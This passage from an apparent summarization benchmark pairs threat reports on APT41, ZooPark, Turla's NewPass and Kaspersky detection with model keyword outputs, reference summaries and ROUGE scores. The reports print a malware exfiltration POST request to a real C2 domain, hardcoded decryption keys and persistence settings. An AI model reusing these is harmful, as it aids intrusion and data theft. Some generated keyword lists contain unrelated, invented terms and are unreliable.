FamilyPOISONPLUGPOISONPLUGLOWKEY.HTTPPOISONPLUGPOISONPLUGurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html16/1710/16/2019LOWKEY: Hunting for the Missing Volume Serial ID | FireEye Inc-DEADEYE.DOWN-DEADEYE.AP\u2010 PENDLOWKEYPOISONPLUGPOISONPLUGPOISONPLUGAppendix 1: List of samples with RC5 encrypted payloadsurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html17/17 ", "generated_text": "APT41; China; APT41; use; malware; payloads; systems; the malware; DeADEYE; RC5 encryption; a unique string; f@Ukd!rCto R$; the key; the C drive; the C2 server; a 4byte value; the install time; the C2 server; the C2 server; a passive TCP listener; a passive HTTP listener; Internet Information Services; IIS; the RC5 key; the C2 server; the C2 server; payloads; the system; the RC5 backdoor; the C2 server; the backdoor; payloads; the system; a TCP listener; HTTP listener; DEADEYE.EXT; POST; the TCP server; the RC5 key; an additional layer; obfuscation; RC5 encryption; a unique string; C2 server; a password; a name; DEADEYE.", "ref_text": "<START-1>The PDF describes analysis of malware used by the threat actor group APT41. The malware uses multiple layers of encryption, including RC5 and RC4, to obfuscate payloads. Researchers were able to decrypt payloads by brute forcing RC5 keys derived from system volume serial numbers. This revealed additional obfuscation layers and full file paths/names from the malware developers. Decrypted payloads included the remote access trojan POISONPLUG, XMRig cryptocurrency miner, and a sophisticated passive backdoor named LOWKEY. LOWKEY has TCP and HTTP variants that covertly listen on ports 53 and 80. It uses named pipes for command and control. Commands support file management, process management, and a reverse shell. The TCP variant uses a rootkit component to intercept and forward traffic to LOWKEY. Overall, the malware uses advanced techniques like rootkits, traffic relay, and API hooking to evade detection. Decryption and analysis of the payloads revealed sophisticated capabilities and provided insights into APT41's development environment. The malware demonstrates APT41's continued evolution and investment into covert access tools. <END-1>", "t5/keyword/hint_hit_precision": 0.10638297872340426, "t5/word/hint_hit_recall": 0.03636363636363636, "gpt3/lexical/rouge_rouge1": 0.4414715719063545, "gpt3/lexical/rouge_rouge2": 0.10101010101010101, "gpt3/lexical/rouge_rougeL": 0.24749163879598662, "gpt3/lexical/rouge_rougeLsum": 0.24749163879598662, "gpt3_generated_text": ["The article discusses the sophisticated backdoor malware known as LOWKEY used by APT41, a China-nexus threat group targeting various industries. The malware utilizes RC5 encryption and a unique string to download additional payloads and append them to the system. The malware's key is derived from the volume serial number of the C drive, which is XORed with a hardcoded constant. The article also details the variants of the DEADEYE malware family, which includes downloading payloads and loading existing ones on the system. LOWKEY comes in two variants, a passive TCP listener and a passive HTTP listener targeting Internet Information Services (IIS). The article provides insights into the analysis of encrypted payloads and position-independent loaders observed in multiple samples, adding an additional layer of obfuscation to the backdoor malware."]}, {"split_name": "val", "sample_id": "val_117", "prompt_text": "Extract the keywords: ExpertiseHow do Kaspersky\u2019s advanced algorithms ensure the best protection for your business against cyber threats?Learn more on kaspersky.comContentsOur Classical Approach to Automatic DetectionHeuristics-Based Approach to Automatic DetectionBehavior DetectionSandboxes, KSN and\u2026 PeopleSmart Records Anti-Virus Records Based on Decision Trees Locality-Sensitive HashingThe Malware Path Keeping False Positives at Bay23445 8Machine Learning and Human ExpertiseEvery year, the quality of our protection wins Kaspersky more awards than anyone else in the cybersecurity industry. This achievement would be impossible without the fusion of a global big data \u2018cyberbrain\u2019 powered by machine learning algorithms and the unequalled expertise of our security teams in combating \u2018next-gen\u2019 threats. We offer you a \u2018sneak peek\u2019 into the heart of Kaspersky\u2019s anti- malware infrastructure, revealing our algorithms and their role in fighting the most dangerous threats to businesses like yours.\u00abHow do Kaspersky\u2019s advanced algorithms ensure the best protection for your business against cyber threats?\u00bbOur Classical Approach to Automatic DetectionOur virus collection contains samples of detectable threats grouped by detection names, e.g. Backdoor.Win32.Hupigon.abc. When a new, undetected sample arrives, we begin by searching our collection for similar samples. The search principle is roughly the same as that used by Google Search. The only difference is that Google Search is word-based, while our searches are based on file features. In the simplest scenario, if the sample has been unpacked successfully we can extract the strings responsible for the malware functionality and use them in much the same way as keywords are used by a search engine.At Kaspersky we have an automated system that handles both the analysis of files and the automatic classification of threats.Google service that searches for similar pictures on the Internet.2This system sorts the inbound stream of samples while simultaneously adding hashes to identify and define detections. One simple hash record covers the detection of just one file, but in this way we can be sure there will be no \u2018false positives\u2019.When malware for which the collection contains no similar samples turns up, we know that this is either something completely new, or that it\u2019s not malware at all. This is where the expertise of human AV Analysts comes into play. By unpacking and detecting a sample, the analyst creates a sort of \u201ccenter of gravity\u201d in the collection. Over time, other modified versions of the new sample will automatically gravitate towards this reference point.Heuristics-Based Approach to Automatic DetectionExclusively hash-based detection only gets you so far: one slight file modification (e.g. a single byte added at the end), and the whole file becomes undetectable again. That\u2019s why we unleash our heuristics-based automatic detection system on the whole family of our malware samples (like Backdoor.Win32.Hubigon.abc etc). With the help of an emulator, the heuristics-based system creates execution logs of all the samples, finds their common execution patterns and creates a single execution-based heuristic record. The benefit of this approach is that new malware samples exhibiting similar behavior will be detected, even if the content includes some changes.Let\u2019s take a closer look at the process by which heuristic detection records are created. The robotic system uses machine learning to extract key execution sequences. The machine doesn\u2019t know or care what particular purpose any sequence of commands serves. As far as it\u2019s concerned, it\u2019s enough to know that this or that execution sequence \u2013 or combination of sequences \u2013 is characteristic of some malware family and could not occur in any clean file. After some iterations, the most effective indicators and their combinations are automatically consolidated into records.Unlike this robot, an experienced human analyst can understand exactly what the sample is up to, despite any attempts to shake the heuristic system\u2019s emulator off its trail. So he or she can write a record straight away, highlighting obvious malware-like behavior.These two different approaches tend to work in parallel, particularly when automatic detection results are inconclusive and an expert second opinion is needed. Robotic and human-made records then work in tandem, ensuring successful detection.To evade detection, the malefactor may change the functionality of his or her malware. But there are limitations. Let\u2019s assume the malware has basic functionality: downloading a file via a malicious link, saving the file to disk and starting it (Trojan- Downloader). There are no more than 10 programmatic ways to download anything from the internet, and no more than five ways to start an executable file. When the malefactor has tried them all and found that every method is detected, their best option is probably to give up and instead mount an attack against a business with no security solution, or a solution lacking execution analysis tools.KERNEL32!LoadLibrary(0x004020B6 \u201cKERNEL32.dll\u201d); KERNEL32!GetTickCount(); KERNEL32!LoadLibrary(0x00403000 \u201ckernel32.dll\u201d); KERNEL32!LoadLibrary(0x0040302C \u201curlmon.dll\u201d); urlmon!URLDownloadTofile(,0x00403061 \u201chttp \u201d,0x004030C5 \u201cc KERNEL32!Sleep() KERNEL32!DeleteFile(0x004030C5 \u201cc:\\\\boot.bak\u201d); urlmon!URLDownloadTofile(,0x0040308F \u201chttp \u201d,0x004030B9 \u201cc:\\\\4Trojan-Downloader.Win32.Small.aon execution log3Inject into a processStart a process Read the registry Download object from URL2 *= MALICIOUS!The malefactor may have another trick up their sleeve: knowing the emulation specifics, they can try to disrupt the emulation process by, for example, inserting long execution delays or asking for system parameters the emulator can\u2019t provide. While some of these tricks can themselves be treated as indicators for detection, we can nonetheless detect the sample\u2019s true functionality through a further method \u2013 using System Watcher, a system that monitors a process\u2019s activities within the actual operating system.Behavior DetectionUnlike the emulator, this component is a true behavioral detection system based on logs of real-life sample executions, so it\u2019s impossible to fool. It has its own set of behavioral records, which in many ways resemble those of the emulator-based detection system.The scope of logging performed by Behavior Detection is considerably wider than is possible during emulation. And, unlike the latter process, this logging has unlimited timeframes: everything suspicious encountered within a given context is considered and cached until enough evidence for detection has been gathered. If malicious activity is detected, the action is simply rolled back.As with the emulation system, Behavior Detection has its role in both on-premise detection and as a part of our in-lab wizardry. Incidentally, Behavior Detection activity is transparent and has no adverse impact on the process being monitored.Continuous on-premise behavioral analysis creates an extremely powerful detection layer, but unleashing the power of Kaspersky infrastructure to execute suspicious files, study their behavior and detect threats via a fast response threat input database such as KSN (Kaspersky Security Network) is even more effective.Sandboxes, KSN and\u2026 PeopleWe continuously test samples \u2013 both known malicious and unknown \u2013 in our internal behavioral Sandbox systems. Some of these Sandboxes mimic user systems running standard products, while the most powerful have tremendously granular logging capabilities, allowing extremely fine-tuned detection.The Sandbox logs, along with Behavior Detection execution statistics received from KSN\u2019s voluntary participants, are processed by both robots and human experts. Robots run two important processes: the logs of new malicious samples\u2019 execution are studied using Machine Learning to find new detection indicators \u2013 and unknown samples are also detected, with static records created for subsequent use both in our infrastructure and on customers\u2019 premises. So even if malware creators are resourceful enough to sidestep the majority of the on-premise detection layers \u2013 usually through extensive reconnaissance and preliminary testing \u2013 they\u2019ll be no better off in the end.Meanwhile, using robot-distilled indicators, human experts create effective behavioral records similar to those based on emulated execution, but with a very much wider range of indicators to utilize.4Smart RecordsThe list of Machine learning-based processes doesn\u2019t end with the above. There are further robotic detection layers capable of detecting sizable families of malware. Usually we call these \u2018Smart Records\u2019.Anti-Virus Records Based on Decision Trees The in-lab robotic part of this system analyzes the same collection of samples as above, and creates or improves records based on decision trees. This makes it possible to separate files into classes and to specify criteria sensitive to the features of those files.How does this work? Let\u2019s look at an example based on the Iris flower data set, a typical test case for statistical classification techniques. Say we have 150 flowers: 50 samples each of Iris Setosa, Iris Virginica and Iris Versicolor. To simplify the task, let\u2019s take the two most informative features of these flowers: petal length (PL) and petal width (PW). Plotting the features of each sample provides data that can be used to create a decision tree which can then allocate one of the three classes to each new Iris sample through \u2018request-response\u2019, like this:Our AV engine uses exactly the same kind of tree. Each decision tree is carefully fine- tuned and delivered to the user. The selected features of an individual file running on the user\u2019s computer are extracted and run through each decision tree. The tree then uses the responses to decide whether or not the file is malicious.PL < 2.501PW > 1.68setosa0PL > 51virginica01versicolorvirginicaPetal length, PL 7,06,56,05,55,04,54,03,53,02,52,01,51,000,2 0,4 0,6 0,81,01,21,41,61,82,02,42,2 2,6 Petal width, PWAxes of the 2 most informative attributes (of 4) two classes splitted accurately, 3 mistakes in 3rd class. Source: Coursera/YandexThe advantage of this approach is its generalizing capabilities: each tree is created in our infrastructure based on a subset of the samples we have, but on users\u2019 computers the tree will also detect any samples not yet acquired by our researchers. For example, in the picture above, any dot in the red zone will be detected as Iris Setosa. A single tree-based record replaces an average of a thousand hash records.Machine learning is indispensable to creating decision trees. While an expert can feed long lists of features to the robot, experts don\u2019t create tree-based records on their own. Only a machine can extract and apply the data, selecting the best features and, most importantly, creating decision rules based on these features. The human expert just monitors the result and controls the process.5Locality-Sensitive Hashing Tree-based detection models are great but still have one major shortcoming: while being created automatically in our internal infrastructure, they can only operate effectively on the host (user\u2019s computer) where the particular file is studied. A cloud system based on this principle would create considerable network traffic, which is undesirable in most cases.Hash-based cloud systems, by contrast, are considerably lighter in terms of traffic. But a typical cryptographic hash, such as MD5 or SHA256 for example, nearly always corresponds to one file only. It\u2019s good that you won\u2019t find a second file with the same hash; false positives are out of the question here. But it would be great having a hash that\u2019s the same for all malware belonging to the same family. In other words, insignificant file modifications would not affect the hash. This is in fact possible with so-called LSH, or Locality-Sensitive Hashing. Requests resulting in detections based on this hash can be made via the cloud.Cryptographic hash(hash values)Very similar \ufb01lesSimilar \ufb01lesNon-similar \ufb01lesMachine Learning: locality sensitive hashingLocality sensitive hash(hash values)How do we calculate levels of similarity between files? Consider the following example.Assume that File A is characterized by the following numerical features: 31, 83, 98, 86, 183, 79, 67, 153, 77, 67Meanwhile, File B is slightly different: 27, 89, 93, 81, 190, 71, 67, 161, 75, 69All numbers can be \u201crounded down\u201d by dividing them by 10. We get: File A: 3, 8, 9, 8, 18, 7, 6, 15, 7, 6 File B: 2, 8, 9, 8, 19, 7, 6, 16, 7, 6As you can see, the feature values are almost identical now.Here\u2019s another approach: calculate the arithmetic mean of numbers in the first and second halves of each of the two files above. The answer turns out to be: File A: 96, 88 File B: 96, 88In this case, the LSH hashes are identical.The challenging aspect of this approach involves choosing features that vary slightly within the same malware family, but which are still different enough to be recognized where a specific clean file is concerned. These features then need to be \u201cquantized\u201d (simply put, they are processed so that their precision is reduced). As you may have guessed, only a robot can do this. But the task is still formulated by a human expert.6The Malware PathOut of 10,000 \u201cnew\u201dsamples, this is the sort of scenario we might expect.9,900 will have been detected by smart records (like locality- sensitive hashes and records based on decision trees).Out of the remaining 100 samples,65 are detected on execution, using System Watcher\u2019s behavioral detection.Of the remaining 35 samples,32 are detected automatically in-lab, based on similarities to the samples from our malware collection.The three remaining by an AV Analyst.All samples (regardless of how they made it into the collection) are frequently re-analyzed for any new detections using generalization technologies (previously described heuristic autorecords/tree-based records/locality-sensitive hash records). If a sample was previously detected using only the individual hash, the detection is \u201cgeneralized\u201d by machine learning, so it\u2019s included into some big \u2018family\u2019 of malware described only by a single record. After that, the individual hash record is deleted.7Keeping False Positives at Bay The story of Machine Learning-powered heuristic detection would not be complete without mentioning the issue of false positives. As with any method based on the generalization principle, these techniques contain the inherent potential for mistakes, resulting in false positive detections. Unexpected shifts in the threat landscape can increase the probability of this happening, so, as well as the continuous constant adjustment of detection models, constant and very tight control over false positives is required.Kaspersky products incorporate automated mechanisms for the tracking, timely switch-off and correction of faulty records. But, following the principle of multi- layeredness in everything and the best possible outcome for customers, all the records, including those created by robots, are under constant scrutiny from the most experienced analysts. They make sure that the records are thoroughly tested and adjusted at appropriate intervals, to ensure the highest possible detection rates while keeping the number of false positives as close to zero as possible. As independent tests consistently prove, they are extremely good at this!All the technologies and approaches described here are instrumental in achieving True Cybersecurity \u2013 but we\u2019re always inventing new ones, to keep every next generation of threats at bay.8.IIS 2Enterprise Cybersecurity: www.kaspersky.com/enterprise TechnoWiki: www.kaspersky.com/technowiki IT Security News: www.kaspersky.com/blog Cyber Threats News: www.securelist.comwww.kaspersky.com ", "generated_text": "Kaspersky; heuristics; automated detection; Virus; Backdoor; Hubigon; ABD; a robot; a human analyst; a hash; the malware; execution logs; execution sequences; a single execution-based heuristic record; C2; the heuristics; the malware; a malicious attachment; a malicious file; logic; a user; a password; the malware; a decryption function; an action; a digital signature; a malicious software; connection; the malware; a backup; a backup; data; a decryption function; a backup; the data; the backdoor; a memory; a custom folder; C2; the backdoor; a different version; the malware; the backdoor; a C2; the malware; persistence; a key; the backdoor; the malware; a c2; the backdoor; the file; the; the system; a C2; the malware; the backdoor; the malware; false positives; Kaspersky; the best protection; the most dangerous threats.", "ref_text": "<START-1>Here is a summary of the key points from the PDF document on Kaspersky's machine learning and human expertise for cybersecurity protection: The PDF outlines how Kaspersky combines automated machine learning algorithms with human expertise to provide effective cybersecurity protection. It describes several of the automated detection methods used by Kaspersky, including: - Classical signature-based detection that searches for similar malware samples in Kaspersky's database. New undetected samples are manually analyzed by experts to create detection signatures that can identify variants. - Heuristics-based detection that looks for common execution patterns across malware samples to create generalized detection rules. This can catch variants even if code is modified. - Behavior detection that monitors real-world execution for suspicious activities. It has unlimited timeframes to gather evidence before determining a detection. - Sandboxing executes suspicious files and studies behavior using granular logging. Machine learning analyzes the logs to find indicators and create detection records. Experts also craft custom behavioral records. - Smart records like decision trees and locality-sensitive hashing generalize detections across malware families using machine learning. They replace individual signature records. - Automatic in-lab systems handle initial analysis and classification. But human experts investigate ambiguous cases and emerging threats. Their expertise guides machine learning and creates behavioral records. - Multi-layered on-device and cloud-based protections work together. Lightweight cloud queries minimize traffic while still detecting variants. - False positives are tightly controlled through automated tracking of faulty records and human review. Experts continuously tune detection models and validate record performance. The combination of advanced machine learning and human expertise allows Kaspersky to provide cutting edge protection able to react to new threats without compromising accuracy. But new technologies are continually developed to stay ahead of evolving attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.08064516129032258, "t5/word/hint_hit_recall": 0.02464788732394366, "gpt3/lexical/rouge_rouge1": 0.3008356545961003, "gpt3/lexical/rouge_rouge2": 0.09523809523809523, "gpt3/lexical/rouge_rougeL": 0.17827298050139276, "gpt3/lexical/rouge_rougeLsum": 0.17827298050139276, "gpt3_generated_text": ["Kaspersky utilizes advanced algorithms to ensure the best protection for businesses against cyber threats. Their automated detection system includes heuristics-based approaches, behavior detection, sandboxes, and machine learning. Human expertise plays a crucial role in analyzing new and undetected samples, creating detection records, and eliminating false positives. The combination of automated algorithms and human analysis allows Kaspersky to effectively detect and combat the most dangerous threats, earning them recognition in the cybersecurity industry."]}, {"split_name": "val", "sample_id": "val_118", "prompt_text": "Extract the keywords: T HREAT SCAT EGORIEST AGSENCYCLOPEDIAST AT IST ICS DESCRIPT IONSEnglishAPT REPORT SWho\u2019s who in the Zoo Who\u2019s who in the Zoo Cyberespionage operation targets Android users in the Middle EastBy Alexey Firsh on May 3, 2018. 10:00 amEnergetic Bear/Crouching Yeti: attacks on serversA Slice of 2017 Sofacy ActivitySofacy APT hits high profile targets with updated toolsetAPT Trends report Q3 2017From Linux to Windows \u2013 New Family of Cross-Platform Desktop Backdoors DiscoveredZooPark is a cyberespionage operation that has been focusing on Middle Eastern targets since at least June 2015. T he threat actors behind the operation infect Android devices using several generations of malware, with the attackers including new features in each iteration. We label them from v1-v4, with v4 being the most recent version deployed in 2017 . From the technical point of view, the evolution of ZooPark has shown notable progress: from the very basic first and second versions, the commercial spyware fork in its third version and then to the complex spyware that is version 4. T his last step is especially interesting, showing a big leap from straightforward code functionality to highly sophisticated malware.Web page converted to PDF with the PDFmyURL PDF creation API!Evolution of ZooP ark malware features Evolution of ZooP ark malware featuresWeb page converted to PDF with the PDFmyURL PDF creation API!We have observed two main distribution vectors for ZooPark \u2013 T elegram channels and watering holes. T he second one was the preferred vector: we found several news websites that have been hacked by the attackers to redirect visitors to a downloading site that serves malicious APKs. Some of the themes observed in campaign include \u201cKurdistan referendum\u201d, \u201cT elegramGroups\u201d and \u201cAlnaharegypt news\u201d, among others.T arget profile has evolved during the last years of campaign, focusing on victims in Egypt, Jordan, Morocco, Lebanon and Iran.If you would like to learn more about our intelligence reports or request more information on a specific report, contact us at: intelreports@kaspersky.com.Web page converted to PDF with the PDFmyURL PDF creation API!Re ad t he f ull \u201cWho \u2019s who in t he Z o o . Cybe r e spio nage o pe r at io n t ar ge t s Re ad t he f ull \u201cWho \u2019s who in t he Z o o . Cybe r e spio nage o pe r at io n t ar ge t sAndr o id use r s in t he Middle East .\u201d r e po r t Andr o id use r s in t he Middle East .\u201d r e po r tAPT BACKDOOR CYBERESPIONAGE GOOGLE ANDROID MALWARE DESCRIPT IONSShare post on:WAT ERING HOLE AT T ACKSRelated Posts Related Posts\uf09a \uf0d5 \uf099Energetic Bear/Crouching Yeti: attacks on serversLeaking adsRoaming Mantis uses DNS hijacking to infect Android smartphonesLEAVE A REPLY LEAVE A REPLY Your e mail addre ss will not be publishe d. Re quire d fie lds are marke d *Ente r your comme nt he reName *Web page converted to PDF with the PDFmyURL PDF creation API!Email *Notify me whe n ne w comme nts are adde d.SUBMITreCAPTCHAPlease upgrade to a supported browser to get a reCAPTCHA challenge.Alternatively if you think you are getting this page in error, please check your internet connection and reload.Why is this happening to me?Web page converted to PDF with the PDFmyURL PDF creation API!\u00a9 2018 AO Kaspe rsky Lab. All Rights Re se rve d. Re giste re d trade marks and se rvice marks are the prope rty of the ir re spe ctive owne rs.EmailSUBSCRIBEContact us | Privacy Policy | Lice nse Agre e me ntWeb page converted to PDF with the PDFmyURL PDF creation API! ", "generated_text": "ZooPark; at least June 2015; Android users; Middle Eastern; at least June 2015; the attackers; new features; each iteration; the evolution; the malware; v1-v4; the most recent version; 2017; the evolution; T elegram channels; watering holes; news websites; download site; malicious APKs; themes; Kurdistan referendum; Alnaharegypt news; the Middle East; victims; Egypt, Jordan, Morocco, Lebanon and Iran; the operations; the region; cyberespionage; commands; tactics; ad; IE; the Middle East; Active Directory; capabilities; the configuration; services; memory; encryption; commands; the same code; the same attacks; Windows; the Middle East.", "ref_text": "<START-1>ZooPark is a cyberespionage campaign active since at least 2015 that targets Android devices primarily in the Middle East. The attackers use evolving malware dubbed v1-v4, with v4 being the most sophisticated version observed in 2017. Initial infection vectors include Telegram channels and watering hole attacks on news sites about topics of interest to victims. Main targets are located in Egypt, Jordan, Morocco, Lebanon, and Iran based on campaign themes. The malware capabilities evolved from basic functions in v1-v2 to incorporating commercial spyware features in v3 and complex spyware in v4. v4 malware shows a big leap in sophistication for conducting audio surveillance, keylogging, retrieving contacts, emails, and more. Later versions communicate with command and control servers to exfiltrate data from infected devices. The report provides an overview of the cyberespionage operation and the technical evolution of the Android malware over multiple versions. <END-1>", "t5/keyword/hint_hit_precision": 0.22727272727272727, "t5/word/hint_hit_recall": 0.0979020979020979, "gpt3/lexical/rouge_rouge1": 0.5328185328185329, "gpt3/lexical/rouge_rouge2": 0.18677042801556423, "gpt3/lexical/rouge_rougeL": 0.30115830115830117, "gpt3/lexical/rouge_rougeLsum": 0.30115830115830117, "gpt3_generated_text": ["The article discusses the cyberespionage operation known as ZooPark, which has been targeting Android users in the Middle East since at least June 2015. The attackers behind ZooPark have been continuously updating their malware, with versions ranging from v1 to v4, the most recent version deployed in 2017. The evolution of ZooPark shows significant progress in terms of sophistication and complexity. The malware is distributed through T elegram channels and watering holes, with themes like \"Kurdistan referendum\" and \"Alnaharegypt news\" being used to lure victims. The target profile has expanded to include victims in Egypt, Jordan, Morocco, Lebanon, and Iran. The operation has shown notable progress from basic code functionality to highly sophisticated malware."]}, {"split_name": "val", "sample_id": "val_119", "prompt_text": "Extract the keywords: 7/23/2020Turla / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyTurla / Venomous Bear updates its arsenal: \u201cNewPass\u201d appears on the APT threat scenetelsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scenewebmaster@telsy.comJuly 14, 2020Recently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked to the popular Russian Advanced Persistent Threat (APT) known as Venomous Bear (aka Turla or Uroburos). At the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally named \u201cNewPass\u201c as one of the parameters used to send exfiltrated data to the command and control.Telsy suspects this implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs.NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other. There are at least three components of the malware: a dropper, that deploys the binary file; a loader library,url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - Telsythat is able to decode the binary file extracting the last component, responsible for performing specific operations, such as communicate with the attackers\u2019 command and control server (the \u201cagent\u201d)The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries\u2019 values.Dropper AnalysisThe first Windows library has a huge size, about 2.6 MB, and it is identified by the number of functions, as shown in the following image.Most of the reported functions point to useless code and only LocalDataVer can be used as an entry point of the DLL, therefore making it useful to understand the malicious behavior.Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities, using \u201cDllMain\u201d or \u201cDllRegisterServer\u201d as an entrypoint function. In this case, both these functions cause the termination of the program, without showing the real malware behavior.The library\u2019s aim is to deploy the backdoor and its configuration file under two different folders depending on attacker\u2019s customization.url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyAccording to what has been observed by our research team, the paths used in this case are the following:Configuration PathBackdoor PathProgramData\\Adobe\\ARM\\Reader_20.021.210_47.dat C:\\Program Files(x86)\\Adobe\\Acrobat Read- er DC\\Reader\\lib3DXquery.dllProgramData\\WindowsHolographic\\SpatialStore\\Holo graphicSpatialStore.swidWindowsHolographicSer- vice.dllFor the second sample we weren\u2019t able to retrieve its dropper. Therefore, it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters, but not the exact location in which the dropper deployed the implant artifact.Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs, such as Adobe Reader or Windows Mixed Reality.In particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and therefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost totally invisible.The configuration file written, at first glance, seems to be totally encrypted and incomprehensible without analyzing the next stage. The following image shows the real payload.url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyTo begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor terminates its execution. Vice versa, once found the file the malware starts to decode and read the current configuration.The first 5 bytes of the file contains the size of the data to read starting from the 6 bytes and which contains the first encoded information useful to allow the malware to load the entire configuration.thAll the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the function as represented in the following image.url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsySo, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to read to obtain the initial configuration.In this specific case, from the decoded bytes it gets the value 00081.So, it proceeds to read other next 81 bytes.url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyDecoding these last ones with the usual key, it obtains a string composed by different parameters separated by \u201c||\u201d, as illustrated below.However, this is still not the final configuration used by the malware, but it contains only the parameters to load the last malicious Windows library, named LastJournalx32.adf, containing the final agent.This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection.During its activity, the loader decrypts and maintains in memory the complete configuration used during the infection chain.It consists of different JSON formatted structures that look like the following:url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - Telsy{ \u201cRefreshToken\u201d:\u201d\u201d, \u201cNoInternetSleepTime\u201d:\u201d3600\u2033, \u201cGetMaxSize\u201d:\u201d60000\u2033, \u201cClientId\u201d:\u201d\u201d, \u201cDropperExportFunctionName\u201d:\u201dLocalDataVer\u201d, \u201cAutorun\u201d:\u201d16\u2033, \u201cImgurImageDeletionTime\u201d:\u201d120\u2033, \u201cRecoveryServers\u201d:[ ], \u201cRunDllPath\u201d:\u201d%Win- Dir%\\\\System32\u2033, \u201cAgentLoaderExportFunctionName\u201d:\u201dLocalDataVer\u201d, \u201cKey\u201d:\u201d[\u2026redacted\u2026]\u201d, \u201cAgentName\u201d:\u201dLastJournalx32.adf\u201d, \u201cUserAgent\u201d:\u201d\u201d, [\u2026truncated\u2026]The structure contains all the information necessary for the loader to correctly launch the final agent. Some of these information are AgentFileSystemName, AgentExportName and AgentName.The agent shares the same memory space of the loader, thus it is able to access to the same configuration and to extract the needed parameters, such as the object named Credentials. It also contains the domain name (newshealthsport[.]com) and the path (/sport/latest.php) of the command-and-control with which the agent will communicate.From the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.Moreover, the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the C2 as identifier of the infected machine.The configuration also embeds a specific structure for persistence mechanisms that appears as follow:{ \u201cAutoruns\u201d: { \u201cService\u201d: { \u201cDisplayName\u201d: \u201cAdobe Update Module\u201d, \u201cServiceName\u201d: \u201cAdobe Update Module\u201d, \u201cEnabled\u201d: \u201ctrue\u201d }, \u201cTaskScheduler\u201d: { \u201cEnabled\u201d: \u201cfalse\u201d }, \u201cRegistry\u201d: { \u201cEnabled\u201d: \u201cfalse\u201d }, \u201cPolicies\u201d: { \u201cEnabled\u201d: \u201cfalse\u201d } } }The implant supports different types of persistence mechanisms: through Service Manager, Task Scheduler, via Registry Key or using Windows GPO.In this specific case, attackers enabled the Service method that allows the malware to interact with the SCManager to create a new service named Adobe Update command-and-control and downloading new commands to be executed.To make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within a POST request. The keywords are specified by attackers during development phase.In the analyzed case, they are the following:dbnew targetloginSo, during the exfiltration phase, the HTTP requests appear as reported in the table belowPOST /sport/latest.php HTTP/1.1 Content-Type: application/x-www-form-urlen- coded User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko Host: newshealthsport. com Content-Length: 170 Connection: Keep- Alive newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&tar- getlogin=t&table_data=[redacted]All the values embedded into the request are encrypted, probably using one of the keys embedded into the previous configuration. The algorithm used during the encryption phase is most probably a custom one.Below, we report a simple scheme of the described infection chain, highlighting the three components of this new threat: the dropper, the loader and the agent.url / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyPersistenceAs mentioned above, the malware is able to create services or tasks or to add registry keys to achieve persistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its path location as ImagePath.ATT&CK Matrixurl / Venomous Bear updates its arsenal: \"NewPass\" appears on the APT threat scene - TelsyTech- niqueT1204T1060T1053T1543T1073T1132T1001TacticDescriptionExecution Threat actor relies upon specific actions by a user in order togain executionPersis- ControlThreat actor adds an entry to the \u201crun keys\u201d in the Registry or startup folder to allow the program will be executed when a user logs inThreat actor uses Windows Task Scheduler to schedule programs or scripts to be executed at a date and timeAdversaries create or modify Windows services to repeatedly ex- ecute malicious payloads as part of persistencePrograms specifies DLLs that are loaded at runtimeCommand and control (C2) information is encoded using a stan- dard data encoding systemCommand and control (C2) communications are hidden in an attempt to make the content more difficult to discover or decipherT1041Exfiltra- tionThreat actor relies on command and control infrastructure to exfiltrate data.", "generated_text": "PDF; artifacts; an attack; Russian; Venomous Bear; Turla; Uroburos; June 2020; the attackers; dropper; loader; a DLL; the decrypted binary; the backdoor; a JSON configuration resident; memory; the persistence; the configurations; the loader; the configuration files; the file; the component; the detection; the time; the module; the malware; the attackers; the path; the command; the DLL; the command; the malware; a custom script; the scripts; the malware; the analysis; the actual malware behavior.", "ref_text": "<START-1>The document provides an analysis by Telsy of a new malware implant called \"NewPass\" used by the Turla/Venomous Bear advanced persistent threat (APT) group in attacks in June 2020 targeting a European Union country's diplomacy/foreign affairs sector. NewPass has three components - a dropper, loader, and agent. The loader decodes configuration from an encrypted file that specifies the agent payload to install. The agent communicates with a command and control server to exfiltrate data. NewPass uses stealthy file paths impersonating legitimate software like Adobe Reader. It achieves persistence by installing a malicious service. The C2 communications encode data using keywords to blend in. The malware is highly configurable via JSON in its configuration file. Telsy provides examples of the encryption schemes, command and control URLs, 